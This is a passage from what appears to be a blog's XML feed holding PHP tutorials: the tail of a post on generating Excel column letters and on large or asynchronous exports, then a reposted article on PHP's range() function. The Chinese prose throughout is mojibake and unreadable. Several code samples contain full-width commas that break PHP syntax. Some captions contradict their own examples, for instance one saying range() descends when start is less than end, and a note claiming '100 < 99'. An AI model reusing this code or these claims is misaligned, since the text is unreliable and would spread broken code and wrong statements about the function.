class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($letter)) &#123;</span><br><span class="line">            $letter[] = <span class="string">'A'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($count &gt; count($data)) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $count++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $letter;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> json_encode(getAlphabet(range(<span class="number">1</span>,<span class="number">100</span>)));</span><br></pre></td></tr></table></figure><p>emmmmï¼Œçœ‹èµ·æ¥ç¦»æˆ‘ä»¬çš„ç›®æ ‡åˆè¿‘äº†ä¸€æ­¥ï¼šå¯ä»¥è¿ç»­ç”Ÿæˆä¸€æ®µå­—æ¯ï¼Œå¹¶ä¸”å¯ä»¥æ ¹æ®æˆ‘ä»¬çš„æ•°æ®é•¿åº¦è‡ªé€‚åº”ï¼Œä½†æ˜¯ï¼å¤šä½è¿›ä½å¦‚ä½•å¤„ç†ï¼Œå¦‚ä½•ä¿éšœå¤šè¿›ä½å¤„ç†çš„æ€§èƒ½é—®é¢˜ï¼Ÿå…³äºè¿™ä¸ªé—®é¢˜ï¼Œç›®å‰çš„æƒ³æ³•æ˜¯å‚ç…§<a href="https://www.ruanyifeng.com/blog/2011/03/4-bit_computer.html" target="_blank" rel="noopener">è®¡ç®—æœºçš„è¿›ä½å®ç°æ€æƒ³</a>ï¼Œå…ˆæŒ–ä¸ªå‘ï¼Œç­‰ææ¸…æ¥šæ¥å¡« :)</p><h1 id="2-å¯¼å‡ºå†…å®¹è¿‡å¤§"><a href="#2-å¯¼å‡ºå†…å®¹è¿‡å¤§" class="headerlink" title="2. å¯¼å‡ºå†…å®¹è¿‡å¤§"></a>2. å¯¼å‡ºå†…å®¹è¿‡å¤§</h1><p>å¾ˆå¤šé¡¹ç›®åˆæœŸçš„æ•°æ®é‡å¾ˆå°ï¼ŒExcel å¯¼å‡ºéå¸¸å¿«ï¼Œä½†éšç€æ•°æ®é‡çš„å¢åŠ ï¼Œå¯¼å‡ºè¶Šæ¥è¶Šæ…¢ï¼Œç›´åˆ°è¶…æ—¶ã€å†…å­˜æº¢å‡ºã€‚æ€æ ·æ‰èƒ½ä¸€åŠ³æ°¸é€¸å‘¢ï¼Ÿ<br>æˆ‘ä»¬çŸ¥é“ï¼ŒPHPExcelï¼ˆæ–°ç‰ˆä¸º PhpSpreadsheet)æ”¯æŒå‘ Excel ä¸­è¿½åŠ å†…å®¹ï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬ä¾ç„¶å¯ä»¥ä½¿ç”¨<code>yield</code>æ¥ä¿è¯å†…å­˜ï¼šæ¯”å¦‚å†…å­˜å¯ä»¥æ‰¿è½½ 1 ä¸‡æ¡æ•°æ®çš„å®¹é‡ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨ yield å…ˆå¤„ç† 1 ä¸‡æ¡æš‚å­˜äºå†…å­˜ä¸­ï¼Œç„¶åå†å°†è¿™ 1 ä¸‡æ¡è¿½åŠ å…¥ç£ç›˜çš„ Excel æ–‡ä»¶ï¼Œè¿™æ ·æ—¢ä¿è¯äº†å†…å­˜çš„ä½¿ç”¨ï¼Œæœ‰ä¿è¯äº†å¤„ç†æ•ˆç‡ã€‚</p><h1 id="3-å¼‚æ­¥å¯¼å‡º"><a href="#3-å¼‚æ­¥å¯¼å‡º" class="headerlink" title="3. å¼‚æ­¥å¯¼å‡º"></a>3. å¼‚æ­¥å¯¼å‡º</h1><p>ä¼—æ‰€å‘¨çŸ¥ï¼ŒPHP æ˜¯é˜»å¡å¼è¯­è¨€ï¼Œä»è€Œå¯¼è‡´ä¸€äº›äº¤äº’åäº§ç”Ÿçš„é•¿æ—¶é—´æ‰§è¡Œçš„ä»»åŠ¡éš¾ä»¥å¤„ç†ã€‚å¦‚æœå¯¹äºä¸€äº›å°å‹çš„å¼‚æ­¥ä»»åŠ¡é€šè¿‡ crontab æ‰§è¡Œï¼Œåˆ™å¯èƒ½å¯¼è‡´åæœŸçš„å®šæ—¶ä»»åŠ¡è¶Šæ¥è¶Šå¤šè€Œéš¾ä»¥ç®¡ç†ï¼Œè€Œ PHP ä¸­çš„<a href="https://www.php.net/manual/en/function.fastcgi-finish-request.php" target="_blank" rel="noopener"><code>fastcgi_finish_request()</code></a>å¯ä»¥ä½¿å®¢æˆ·ç«¯ç»“æŸè¿æ¥åï¼Œéœ€è¦å¤§é‡æ—¶é—´è¿è¡Œçš„ä»»åŠ¡èƒ½å¤Ÿç»§ç»­è¿è¡Œï¼Œæ­£å¥½æ»¡è¶³æˆ‘ä»¬è½»é‡çš„å¼‚æ­¥æ‰§è¡Œéœ€æ±‚ã€‚ä½†è¯¥æ–¹å¼ä¹Ÿä¼šæœ‰ä¸€äº›é—®é¢˜ï¼Œå¦‚è¯¥æ–¹å¼æ— é”™è¯¯é‡è¯•æœºåˆ¶ã€‚å¦‚æœæœ‰å¤§é‡éœ€è¦å¼‚æ­¥å¤„ç†çš„ä»»åŠ¡éœ€è¦æ‰§è¡Œï¼Œå»ºè®®ä½¿ç”¨ swoole æˆ–è€…æ”¯æŒå¼‚æ­¥æ‰§è¡Œçš„è¯­è¨€ã€‚</p><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><ol><li><a href="http://www.laruence.com/2010/07/30/1682.html" target="_blank" rel="noopener">æ³¨æ„PHPå¯¹å­—ç¬¦ä¸²çš„é€’å¢è¿ç®—</a></li><li><a href="https://www.php.net/manual/zh/class.generator.php" target="_blank" rel="noopener">ç”Ÿæˆå™¨ - PHPæ‰‹å†Œ</a></li><li><a href="https://www.php.net/manual/zh/language.generators.syntax.php" target="_blank" rel="noopener">yieldå…³é”®å­— - PHPæ‰‹å†Œ</a></li><li><a href="https://www.ruanyifeng.com/blog/2011/03/4-bit_computer.html" target="_blank" rel="noopener">å››ä½è®¡ç®—æœºçš„åŸç†åŠå®ç° - é˜®ä¸€å³°</a></li><li><a href="https://tyloafer.github.io/posts/63198/" target="_blank" rel="noopener">PHPå¦‚ä½•è¯»å–å¤§æ–‡ä»¶</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> è½¯ä»¶ç¼–ç¨‹ </category>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€è½¬ã€‘é²œä¸ºäººçŸ¥çš„ PHP range() å‡½æ•°</title>
      <link href="/post/php-range-function/"/>
      <url>/post/php-range-function/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8cm9sq38lj309v03yjrd.jpg" alt=""></p><p>PHPä¸­æœ‰å“ªäº›å†·é—¨ä½†å¾ˆå®ç”¨çš„å‡½æ•°ï¼Ÿ</p><a id="more"></a><p>ä½œä¸ºä¸€ä¸ª PHPer ï¼Œå¦‚æœæƒ³è¦ä½ ç”Ÿæˆ <code>[1,31]</code> åŒºé—´çš„ 31 ä¸ªæ•°å­—ï¼Œä½ ä¸€èˆ¬ä¼šæ€ä¹ˆåšï¼Ÿ</p><p>ä»”ç»†æƒ³æƒ³ï¼Œå¥½å¥½å›å¿†ä¸€ä¸‹ï¼Œä½ ç¬¬ä¸€æ—¶é—´æƒ³åˆ°çš„ï¼Œä¼šä¸ä¼šæ˜¯ä½¿ç”¨ä¸€ä¸ª for å¾ªç¯æ¥ç”Ÿæˆï¼Œå°±åƒä¸‹é¢è¿™æ ·</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$days = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">1</span>; $i &lt;= <span class="number">31</span>; $i++ ) &#123;</span><br><span class="line">    $days[] = $i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘æƒ³ï¼Œåº”è¯¥ï¼Œå¾ˆå°‘äººä¼šä½¿ç”¨ <code>range()</code> å‡½æ•°æ¥ç”Ÿæˆ<code>$days = range(1,31,1);</code></p><p>æˆ‘ä¸çŸ¥é“è¿™æ˜¯ä¸æ˜¯æˆ‘ä»¬ PHPer çš„æ‚²å‰§ï¼Œå› ä¸ºï¼Œä¼¼ä¹ï¼Œå¾ˆå°‘æœ‰æ•™ç¨‹ä¼šäº¤ä»£å¯ä»¥ä½¿ç”¨ <code>foreach(range())</code> çš„æ–¹å¼æ¥ä»£æ›¿ <code>for</code> å¾ªç¯ã€‚</p><p>å…¶å®ï¼ŒPHP ä¸­çš„ <code>range()</code> å‡½æ•°æ¯” Python ä¸­çš„ <code>range()</code> å¼ºå¤§å¤šäº†ï¼Œé™¤äº†æ²¡æœ‰ä½¿ç”¨ç”Ÿæˆå™¨çš„æ–¹å¼ã€‚</p><h1 id="range-å‡½æ•°"><a href="#range-å‡½æ•°" class="headerlink" title="range() å‡½æ•°"></a>range() å‡½æ•°</h1><p>æ ¹æ®å®˜æ–¹æ–‡æ¡£ï¼Œ<code>range()</code> å‡½æ•°è¢«å½’çº³ä¸º ã€Œ æ•°ç»„å‡½æ•° ã€ï¼Œå› ä¸ºå®ƒçš„ç»“æœå°±æ˜¯äº§ç”Ÿä¸€ä¸ªæ•°ç»„ï¼Œä¸€ä¸ªæ™®é€šæ•°ç»„ã€‚</p><p><code>range()</code> å‡½æ•°çš„åŸå‹å¦‚ä¸‹</p><p><code>array range ( mixed $start , mixed $end [, number $step = 1 ] )</code><br>range() å‡½æ•°æ ¹æ®èŒƒå›´ <code>[$start,$end]</code> åˆ›å»ºä¸€ä¸ªæ•°ç»„ï¼Œæ­¥é•¿ä¸º <code>$step</code> ï¼Œé»˜è®¤æ­¥é•¿ä¸º <code>1</code></p><blockquote><p>æ³¨æ„ï¼š è¿”å›çš„åŒºé—´æ˜¯ä¸€ä¸ªå·¦é—­å³é—­çš„åŒºé—´ï¼Œä¹Ÿå°±æ˜¯åŒ…å«äº† $start å’Œ $end ä¸¤ä¸ªå€¼ã€‚</p></blockquote><table><thead><tr><th>å‚æ•°</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>start</td><td>è¿”å›çš„æ•°ç»„åŒºé—´åºåˆ—çš„ç¬¬ä¸€ä¸ªå€¼</td></tr><tr><td>end</td><td>è¿”å›çš„æ•°ç»„åŒºé—´åºåˆ—ç»“æŸäº end çš„å€¼</td></tr><tr><td>step</td><td>å¦‚æœè®¾ç½®äº†æ­¥é•¿ stepï¼Œä¼šè¢«ä½œä¸ºå•å…ƒä¹‹é—´çš„æ­¥è¿›å€¼ã€‚step åº”è¯¥ä¸º æ­£å€¼ã€‚ä¸è®¾ç½® step åˆ™é»˜è®¤ä¸º 1ã€‚</td></tr></tbody></table><h1 id="ç”¨æ³•ä¸€-ï¼š-start-å’Œ-end-å‚æ•°éƒ½æ˜¯æ•´æ•°"><a href="#ç”¨æ³•ä¸€-ï¼š-start-å’Œ-end-å‚æ•°éƒ½æ˜¯æ•´æ•°" class="headerlink" title="ç”¨æ³•ä¸€ ï¼š $start å’Œ $end å‚æ•°éƒ½æ˜¯æ•´æ•°"></a>ç”¨æ³•ä¸€ ï¼š $start å’Œ $end å‚æ•°éƒ½æ˜¯æ•´æ•°</h1><ol><li><p>è¿”å›æ•´æ•°åŒºé—´ [0,12] ä¸”æ­¥é•¿ä¸º 1 çš„æ•°ç»„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// array(0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12)</span></span><br><span class="line"><span class="keyword">foreach</span> (range(<span class="number">0</span>, <span class="number">12</span>) <span class="keyword">as</span> $number) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $number;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>è¿”å›æ•´æ•°åŒºé—´ [0,100] ä¸”æ­¥é•¿ä¸º 10 çš„æ•°ç»„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// array(0, 10, 20, 30, 40, 50, 60, 70, 80, 90, 100)</span></span><br><span class="line"><span class="keyword">foreach</span> (range(<span class="number">0</span>, <span class="number">100</span>, <span class="number">10</span>) <span class="keyword">as</span> $number) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $number;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>è¿”å›æ•´æ•°åŒºé—´ [0,99] ä¸”æ­¥é•¿ä¸º 10 çš„æ•°ç»„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// array(0, 10, 20, 30, 40, 50, 60, 70, 80, 90)</span></span><br><span class="line"><span class="keyword">foreach</span> (range(<span class="number">0</span>, <span class="number">99</span>, <span class="number">10</span>) <span class="keyword">as</span> $number) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $number, <span class="string">" "</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><blockquote><p>æ³¨æ„ï¼šè¿”å›çš„æ•°ç»„çš„æœ€åä¸€ä¸ªå€¼ä¸º 90 ï¼Œå› ä¸º 100 &lt; 99 ï¼Œæ‰€ä»¥ä¸æ»¡è¶³æ¡ä»¶</p></blockquote><ol start="4"><li><p>å¦‚æœæ­¥é•¿ä¸ºè´Ÿæ•°ï¼Œé‚£ä¹ˆä¼šå–è¯¥æ­¥é•¿çš„ç»å¯¹å€¼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// array(0, 2, 4, 6, 8, 10, 12)</span></span><br><span class="line"><span class="keyword">foreach</span> (range(<span class="number">0</span>, <span class="number">12</span>ï¼Œ<span class="number">2</span>) <span class="keyword">as</span> $number) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $number;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>å¦‚æœ $start &lt; $endï¼Œé‚£ä¹ˆè¿”å›çš„æ•°ç»„ä¼šä»å¤§åˆ°å°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// array(12, 10, 8, 6, 4, 2, 0)</span></span><br><span class="line"><span class="keyword">foreach</span> (range(<span class="number">12</span>, <span class="number">0</span>ï¼Œ<span class="number">2</span>) <span class="keyword">as</span> $number) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $number;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>å¦‚æœæ­¥é•¿ $step ä¸º 0 ï¼Œä¼šæŠ›å‡ºä¸€ä¸ªå¼‚å¸¸</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Warning: range(): step exceeds the specified range</span></span><br><span class="line">var_dump(range(<span class="number">12</span>, <span class="number">0</span>, <span class="number">0</span>));</span><br></pre></td></tr></table></figure></li><li><p>å¦‚æœæ­¥é•¿ä¸ºå­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆä¼šä½¿ç”¨ <code>intval()</code> è½¬æ¢ä¸ºæ•´æ•°ï¼Œå¦‚æœè½¬æ¢åçš„ç»“æœä¸º 0ï¼Œåˆ™å‚è€ƒ 6</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// array(12, 10, 8, 6, 4, 2, 0)</span></span><br><span class="line"><span class="keyword">foreach</span> (range(<span class="number">12</span>, <span class="number">0</span>ï¼Œ<span class="string">'2a'</span>) <span class="keyword">as</span> $number) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $number;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h1 id="ç”¨æ³•äºŒ-ï¼š-start-å’Œ-end-å‚æ•°å¯ä»¥æ˜¯æ•´æ•°ä¹Ÿå¯ä»¥æ˜¯æµ®ç‚¹æ•°ï¼Œ-step-ä¹Ÿå¯ä»¥æ˜¯æµ®ç‚¹æ•°"><a href="#ç”¨æ³•äºŒ-ï¼š-start-å’Œ-end-å‚æ•°å¯ä»¥æ˜¯æ•´æ•°ä¹Ÿå¯ä»¥æ˜¯æµ®ç‚¹æ•°ï¼Œ-step-ä¹Ÿå¯ä»¥æ˜¯æµ®ç‚¹æ•°" class="headerlink" title="ç”¨æ³•äºŒ ï¼š $start å’Œ $end å‚æ•°å¯ä»¥æ˜¯æ•´æ•°ä¹Ÿå¯ä»¥æ˜¯æµ®ç‚¹æ•°ï¼Œ$step ä¹Ÿå¯ä»¥æ˜¯æµ®ç‚¹æ•°"></a>ç”¨æ³•äºŒ ï¼š <code>$start</code> å’Œ <code>$end</code> å‚æ•°å¯ä»¥æ˜¯æ•´æ•°ä¹Ÿå¯ä»¥æ˜¯æµ®ç‚¹æ•°ï¼Œ<code>$step</code> ä¹Ÿå¯ä»¥æ˜¯æµ®ç‚¹æ•°</h1><ol><li><p><code>$start</code> å’Œ <code>$end</code> æ˜¯æµ®ç‚¹æ•°ï¼Œè€Œ <code>$step</code> æ˜¯æ•´æ•°ï¼Œç»“æœå’Œæ•´æ•°æ˜¯ç±»ä¼¼çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// array(12.8, 10.8, 8.8, 6.8, 4.8, 2.8)</span></span><br><span class="line"><span class="keyword">foreach</span> (range(<span class="number">12.8</span>, <span class="number">2.2</span>ï¼Œ<span class="number">2</span>) <span class="keyword">as</span> $number) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $number;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>$start</code> å’Œ <code>$end</code> æ˜¯æµ®ç‚¹æ•°ï¼Œä¸” <code>$step</code> ä¹Ÿæ˜¯æµ®ç‚¹æ•°ï¼Œç»“æœå’Œæ•´æ•°ä¹Ÿæ˜¯ç±»ä¼¼çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// array(12.8, 10.3, 7.8, 5.3, 2.8)</span></span><br><span class="line"><span class="keyword">foreach</span> (range(<span class="number">12.8</span>, <span class="number">2.2</span>ï¼Œ<span class="number">2.5</span>) <span class="keyword">as</span> $number) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $number;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>å¦‚æœæ­¥é•¿ä¸ºå­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆä¼šä½¿ç”¨ <code>doubleval()</code> è½¬æ¢ä¸ºæµ®ç‚¹æ•°ï¼Œå¦‚æœæ­¥é•¿ä¸º <code>0.0</code> é‚£ä¹ˆå°†æŠ›å‡ºå¼‚å¸¸</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// array(12.8, 10.3, 7.8, 5.3, 2.8)</span></span><br><span class="line"><span class="keyword">foreach</span> (range(<span class="number">12.8</span>, <span class="number">2.2</span>ï¼Œ<span class="string">'2.5'</span>) <span class="keyword">as</span> $number) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $number;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>è½¬æ¢åæ­¥é•¿ä¸º 0 åˆ™æŠ›å‡ºå¼‚å¸¸</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Warning: range(): step exceeds the specified range</span></span><br><span class="line"><span class="keyword">foreach</span> (range(<span class="number">12.8</span>, <span class="number">2.2</span>ï¼Œ<span class="string">'a2.5'</span>) <span class="keyword">as</span> $number) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $number;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="ç”¨æ³•ä¸‰-ï¼š-start-å’Œ-end-å¦‚æœæœ‰ä¸€ä¸ªæ˜¯æ•´æ•°æˆ–è€…æµ®ç‚¹æ•°"><a href="#ç”¨æ³•ä¸‰-ï¼š-start-å’Œ-end-å¦‚æœæœ‰ä¸€ä¸ªæ˜¯æ•´æ•°æˆ–è€…æµ®ç‚¹æ•°" class="headerlink" title="ç”¨æ³•ä¸‰ ï¼š $start å’Œ $end å¦‚æœæœ‰ä¸€ä¸ªæ˜¯æ•´æ•°æˆ–è€…æµ®ç‚¹æ•°"></a>ç”¨æ³•ä¸‰ ï¼š <code>$start</code> å’Œ <code>$end</code> å¦‚æœæœ‰ä¸€ä¸ªæ˜¯æ•´æ•°æˆ–è€…æµ®ç‚¹æ•°</h1><p><code>$start</code> å’Œ <code>$end</code> å¦‚æœæœ‰ä¸€ä¸ªæ˜¯æ•´æ•°æˆ–è€…æµ®ç‚¹æ•°ï¼Œè€Œå¦ä¸€ä¸ªæ˜¯å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆä¼šå°†å¦ä¸€ä¸ªä¹Ÿè½¬æ¢ä¸ºæ•´æ•°æˆ–è€…æµ®ç‚¹æ•°</p><ol><li><p>ä¸€ä¸ªæ˜¯æ•´æ•°è€Œå¦ä¸€ä¸ªæ˜¯å­—ç¬¦ä¸²æ•´æ•°ï¼Œé‚£ä¹ˆä¼šå°†å¦ä¸€ä¸ªè½¬æ¢ä¸ºæ•´æ•°ï¼Œç»“æœå’Œéƒ½æ˜¯æ•´æ•°æ˜¯ç±»ä¼¼çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// array(0, 2, 4, 6, 8, 10, 12)</span></span><br><span class="line"><span class="keyword">foreach</span> (range(<span class="number">0</span>, <span class="string">'12'</span>ï¼Œ<span class="number">2</span>) <span class="keyword">as</span> $number) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $number;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>ä¸€ä¸ªæ˜¯æµ®ç‚¹æ•°è€Œå¦ä¸€ä¸ªæ˜¯å­—ç¬¦ä¸²æ•´æ•°æˆ–æµ®ç‚¹æ•°ï¼Œé‚£ä¹ˆä¼šå°†å¦ä¸€ä¸ªè½¬æ¢ä¸ºæµ®ç‚¹æ•°ï¼Œç»“æœå’Œéƒ½æ˜¯æ•´æ•°æ˜¯ç±»ä¼¼çš„</p></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// array(12.8, 10.8, 8.8, 6.8, 4.8, 2.8)</span></span><br><span class="line"><span class="keyword">foreach</span> (range(<span class="number">12.8</span>, <span class="string">'2'</span>, <span class="number">2</span>) <span class="keyword">as</span> $number) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $number;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="ç”¨æ³•å››-ï¼š-start-å’Œ-end-å¦‚æœå…¨éƒ¨æ˜¯å­—ç¬¦ä¸²"><a href="#ç”¨æ³•å››-ï¼š-start-å’Œ-end-å¦‚æœå…¨éƒ¨æ˜¯å­—ç¬¦ä¸²" class="headerlink" title="ç”¨æ³•å›› ï¼š $start å’Œ $end å¦‚æœå…¨éƒ¨æ˜¯å­—ç¬¦ä¸²"></a>ç”¨æ³•å›› ï¼š <code>$start</code> å’Œ <code>$end</code> å¦‚æœå…¨éƒ¨æ˜¯å­—ç¬¦ä¸²</h1><p><code>$start</code> å’Œ <code>$end</code> å¦‚æœå…¨éƒ¨æ˜¯å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆä¼šå–ä¸¤ä¸ªå­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªå­—æ¯ï¼Œå¹¶æŒ‰ç…§ ASCII å­—æ¯é¡ºåºè¡¨ï¼Œå–æ­¥é•¿å¯¹åº”çš„å€¼</p><ol><li><p>å¦‚æœ <code>$start</code> å’Œ <code>$end</code> éƒ½æ˜¯å•ä¸ªå­—æ¯ï¼Œé‚£ä¹ˆç›´æ¥æŒ‰ç…§ ASCII é¡ºåºå–æ­¥é•¿çš„å€¼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// array('a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i');</span></span><br><span class="line"><span class="keyword">foreach</span> (range(<span class="string">'a'</span>, <span class="string">'i'</span>) <span class="keyword">as</span> $letter) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $letter;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>å¦‚æœæŒ‰ç…§ ASCII é¡ºåºï¼Œ<code>$start</code> å¤§äº <code>$end</code> ï¼Œé‚£ä¹ˆä¼šåå‘æ­¥é•¿å–å€¼ï¼Œè¿™ä¸ªå’Œæ•´æ•°æ˜¯ç±»ä¼¼çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// array('c', 'b', 'a');</span></span><br><span class="line"><span class="keyword">foreach</span> (range(<span class="string">'c'</span>, <span class="string">'a'</span>) <span class="keyword">as</span> $letter) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $letter;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>å¦‚æœ <code>$start</code> æˆ– <code>$end</code> ä»»æ„ä¸€ä¸ªå­—ç¬¦ä¸²é•¿åº¦å¤§äº 1 ï¼Œé‚£ä¹ˆåªä¼šå–ç¬¬ä¸€ä¸ªå­—æ¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// array('a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i');</span></span><br><span class="line"><span class="keyword">foreach</span> (range(<span class="string">'abc'</span>, <span class="string">'i'</span>) <span class="keyword">as</span> $letter) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $letter;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>å¦‚æœä¸¤ä¸ªéƒ½æ˜¯å­—ç¬¦ä¸²ï¼Œè€Œå…¶ä¸­ä¸€ä¸ªæ˜¯æ•´æ•°å­—ç¬¦ä¸²æˆ–è€…æµ®ç‚¹æ•°å­—ç¬¦ä¸²ï¼Œé‚£ä¹Ÿä¼šå½“ä½œæ™®é€šå­—ç¬¦ä¸²æ¥å¤„ç†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> implode(<span class="string">""</span>,range(<span class="string">"9 "</span>,<span class="string">"Q"</span>));  <span class="comment">//space after the 9</span></span><br><span class="line"><span class="comment">// prints 9:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQ</span></span><br></pre></td></tr></table></figure></li></ol><blockquote><p>é‚£ä¹ˆï¼Œæˆ‘ä»¬å¦‚ä½•ä½¿ç”¨<code>range()</code>æ¥è¾“å‡º <a href="https://zh.wikipedia.org/wiki/ASCII" target="_blank" rel="noopener">ASCII</a> çš„æ‰€æœ‰å¯è§å­—ç¬¦å‘¢ï¼Ÿ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> json_encode(range(<span class="string">' '</span>, <span class="string">'~'</span>)); </span><br></pre></td></tr></table></figure><p>è¾“å‡ºæ˜¯</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">" "</span>,<span class="string">"!"</span>,<span class="string">"\""</span>,<span class="string">"#"</span>,<span class="string">"$"</span>,<span class="string">"%"</span>,<span class="string">"&amp;"</span>,<span class="string">"'"</span>,<span class="string">"("</span>,<span class="string">")"</span>,<span class="string">"*"</span>,<span class="string">"+"</span>,<span class="string">","</span>,<span 